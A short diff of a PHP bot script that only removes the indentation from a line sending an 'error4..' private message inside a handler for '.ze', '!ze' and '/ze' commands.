@@ -546,7 +546,7 @@ if (!isset($_SESSION['message_times'])) {
 if (strpos($message, ".ze") === 0 || strpos($message, "!ze") === 0 || strpos($message, "/ze") === 0) {
 
 
-	sendPv($myid, 'error4..');
+sendPv($myid, 'error4..');
 
 
 $lista = substr($message, 4);
